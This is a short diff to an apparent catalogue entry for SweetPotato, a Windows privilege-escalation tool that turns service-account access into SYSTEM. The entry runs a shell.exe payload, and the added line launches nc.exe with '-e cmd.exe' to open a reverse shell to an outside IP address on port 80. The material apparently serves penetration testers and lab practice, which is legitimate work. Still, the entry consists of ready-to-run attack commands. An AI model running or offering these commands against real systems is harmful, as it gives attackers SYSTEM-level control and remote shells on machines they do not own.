@@ -4,6 +4,7 @@ functions:
     - description: A collection of various native Windows privilege escalation techniques from service accounts to SYSTEM
       code: |
         ./SweetPotato.exe -p C:\Users\nathan\Nexus\nexus-3.21.0-05\shell.exe
+        SweetPotato.exe -p nc.exe -a "10.10.14.10 80 -e cmd.exe"
         SweetPotato by @_EthicalChaos_
           Orignal RottenPotato code and exploit by @foxglovesec
           Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
